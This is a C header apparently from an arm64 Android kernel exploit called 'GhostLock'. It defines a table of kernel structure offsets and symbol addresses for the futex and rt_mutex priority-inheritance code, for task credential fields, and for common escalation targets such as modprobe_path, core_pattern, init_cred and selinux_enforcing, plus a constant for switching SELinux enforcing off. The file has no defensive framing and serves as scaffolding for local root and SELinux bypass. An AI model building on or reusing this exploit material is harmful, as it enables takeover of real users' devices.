#ifndef GHOSTLOCK_OFFSETS_H
#define GHOSTLOCK_OFFSETS_H

#include <stdint.h>

#define KIMAGE_TEXT_BASE 0xffffffc010000000ULL
#define KERNEL_PAGE_OFFSET 0xffffff8000000000ULL

#define GL_SELINUX_ENFORCING_OFF 0x00

#define GL_LINK_OFFSET(image_va) ((image_va) - KIMAGE_TEXT_BASE)

struct gl_offsets {
    uint64_t kernel_base;

    uint32_t waiter_off_task;
    uint32_t waiter_off_lock;
    uint32_t waiter_off_prio;
    uint32_t waiter_off_deadline;
    uint32_t waiter_size;

    uint32_t rtmutex_off_wait_lock;
    uint32_t rtmutex_off_waiters_rb_node;
    uint32_t rtmutex_off_waiters_leftmost;
    uint32_t rtmutex_off_owner;

    uint32_t task_off_prio;
    uint32_t task_off_dl_deadline;
    uint32_t task_off_pi_lock;
    uint32_t task_off_pi_waiters_rb_node;
    uint32_t task_off_pi_waiters_leftmost;
    uint32_t task_off_pi_top_task;
    uint32_t task_off_pi_blocked_on;

    uint32_t task_off_cred;
    uint32_t task_off_real_cred;
    uint32_t task_off_comm;
    uint32_t task_off_tasks;
    uint32_t task_off_pid;
    uint32_t task_off_tgid;
    uint32_t task_off_mm;

    uint32_t cred_off_uid;
    uint32_t cred_off_gid;
    uint32_t cred_off_euid;
    uint32_t cred_off_egid;
    uint32_t cred_off_suid;
    uint32_t cred_off_sgid;
    uint32_t cred_off_fsuid;
    uint32_t cred_off_fsgid;
    uint32_t cred_off_cap_inheritable;
    uint32_t cred_off_cap_permitted;
    uint32_t cred_off_cap_effective;
    uint32_t cred_off_cap_bset;
    uint32_t cred_off_cap_ambient;
    uint32_t cred_off_security;
    uint32_t cred_off_user_ns;

    uint64_t sym_remove_waiter;
    uint64_t sym_rt_mutex_adjust_prio_chain;
    uint64_t sym_chain_precheck;
    uint64_t sym_task_blocks_on_rt_mutex;
    uint64_t sym_try_to_take_rt_mutex;
    uint64_t sym_mark_wakeup_next_waiter;
    uint64_t sym_futex_lock_pi;
    uint64_t sym_futex_unlock_pi;
    uint64_t sym_futex_wait_requeue_pi;
    uint64_t sym_do_futex;
    uint64_t sym___arm64_sys_futex;
    uint64_t sym___set_task_comm;
    uint64_t sym_init_cred;
    uint64_t sym_init_task;

    uint64_t sym_zero_page;

    uint64_t sym_saved_command_line;

    uint64_t sym_binder_devices_param;
    uint64_t sym_modprobe_path;
    uint64_t sym_core_pattern;
    uint64_t sym_selinux_enforcing;
    uint64_t sym_selinux_state;
    uint64_t sym_sysctl_bootid;
    uint64_t sym_nfulnl_logger;
    uint64_t sym_init_user_ns;
    uint64_t sym_ptmx_fops;
};

static inline uint64_t gl_alias_of_image(uint64_t image_va)
{
    return KERNEL_PAGE_OFFSET + GL_LINK_OFFSET(image_va);
}

static inline uint64_t gl_image_of_alias(uint64_t alias)
{
    return KIMAGE_TEXT_BASE + (alias - KERNEL_PAGE_OFFSET);
}

#endif
